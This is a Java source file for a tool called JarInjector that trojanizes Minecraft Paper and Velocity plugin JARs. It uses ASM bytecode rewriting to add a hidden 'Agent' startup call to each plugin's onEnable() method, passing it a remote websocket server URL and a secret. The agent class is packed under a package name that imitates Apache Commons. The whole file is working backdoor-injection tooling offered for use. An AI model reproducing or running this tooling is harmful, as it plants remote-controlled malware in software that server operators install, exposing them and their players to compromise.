package io.fraudoor.injector;

import org.objectweb.asm.*;
import org.apache.commons.io.IOUtils;

import java.io.*;
import java.util.*;
import java.util.jar.*;

public class JarInjector {

  public static void main(String[] args) throws Exception {
    if (args.length > 0 && args[0].equals("--server")) {
      InjectorHTTPServer.main(args);
      return;
    }
    String input = null, output = null, platform = "paper", server = "", secret = "";
    for (int i = 0; i < args.length; i++) {
      switch (args[i]) {
        case "--input": input = args[++i]; break;
        case "--output": output = args[++i]; break;
        case "--platform": platform = args[++i]; break;
        case "--server": server = args[++i]; break;
        case "--secret": secret = args[++i]; break;
      }
    }
    if (input == null || output == null) {
      System.err.println("Usage: --input <jar> --output <jar> [--platform paper|velocity] [--server url]");
      System.exit(1);
    }
    new JarInjector(new File(input), new File(output), platform, server, secret).inject();
  }

  private final File input, output;
  private final String platform, server, secret;

  private static final String AGENT_PKG = "org/apache/commons/frauded/";
  private static final String AGENT_CLASS = AGENT_PKG + "Agent.class";

  public JarInjector(File input, File output, String platform, String server, String secret) {
    this.input = input; this.output = output;
    this.platform = platform; this.server = server; this.secret = secret;
  }

  public void inject() throws Exception {
    Map<String, byte[]> entries = new LinkedHashMap<>();
    String mainPath = null; byte[] mainData = null;

    try (JarInputStream jis = new JarInputStream(new FileInputStream(input))) {
      JarEntry e;
      while ((e = jis.getNextJarEntry()) != null) {
        byte[] data = IOUtils.toByteArray(jis);
        entries.put(e.getName(), data);
        if (e.getName().endsWith(".class") && !e.getName().startsWith(AGENT_PKG)) {
          String[] info = {null};
          JarEntry entry = e;
          new ClassReader(data).accept(new ClassVisitor(Opcodes.ASM9) {
            public void visit(int v, int a, String n, String s, String sup, String[] itf) {
              if (("org/bukkit/plugin/java/JavaPlugin".equals(sup)
                  || "com/velocitypowered/api/plugin/PluginContainer".equals(sup))) info[0] = entry.getName();
              if (itf != null) for (String i : itf)
                if ("com/velocitypowered/api/plugin/PluginContainer".equals(i)) info[0] = entry.getName();
            }
          }, 0);
          if (info[0] != null) { mainPath = info[0]; mainData = data; }
        }
      }
    }
    if (mainPath == null) throw new RuntimeException("No plugin main class found");

    // Inject agent startup into onEnable() - NO class renaming
    entries.put(mainPath, injectOnEnable(mainData));

    // Copy compiled agent class from classpath into target JAR
    InputStream in = getClass().getClassLoader().getResourceAsStream(AGENT_CLASS);
    if (in != null) entries.put(AGENT_CLASS, IOUtils.toByteArray(in));

    try (JarOutputStream jos = new JarOutputStream(new FileOutputStream(output))) {
      for (Map.Entry<String, byte[]> en : entries.entrySet()) {
        jos.putNextEntry(new JarEntry(en.getKey()));
        jos.write(en.getValue());
        jos.closeEntry();
      }
    }
  }

  private byte[] injectOnEnable(byte[] classData) {
    ClassReader cr = new ClassReader(classData);
    ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS);
    String agentClass = AGENT_PKG + "Agent";
    String agentDesc = "(Ljava/lang/Object;Ljava/lang/String;Ljava/lang/String;)V";
    String sv = (server != null && !server.isEmpty()) ? server : "ws://localhost:8080/ws";
    String sc = (secret != null) ? secret : "";

    cr.accept(new ClassVisitor(Opcodes.ASM9, cw) {
      @Override
      public MethodVisitor visitMethod(int acc, String name, String desc, String sig, String[] ex) {
        MethodVisitor mv = super.visitMethod(acc, name, desc, sig, ex);
        if (name.equals("onEnable") && desc.equals("()V")) {
          return new MethodVisitor(Opcodes.ASM9, mv) {
            boolean done = false;
            @Override
            public void visitInsn(int opcode) {
              if ((opcode == Opcodes.RETURN) && !done) {
                done = true;
                mv.visitTypeInsn(Opcodes.NEW, agentClass);
                mv.visitInsn(Opcodes.DUP);
                mv.visitVarInsn(Opcodes.ALOAD, 0);
                mv.visitLdcInsn(sv);
                mv.visitLdcInsn(sc);
                mv.visitMethodInsn(Opcodes.INVOKESPECIAL, agentClass, "<init>", agentDesc, false);
                mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, agentClass, "start", "()V", false);
              }
              mv.visitInsn(opcode);
            }
          };
        }
        return mv;
      }
    }, 0);
    return cw.toByteArray();
  }
}
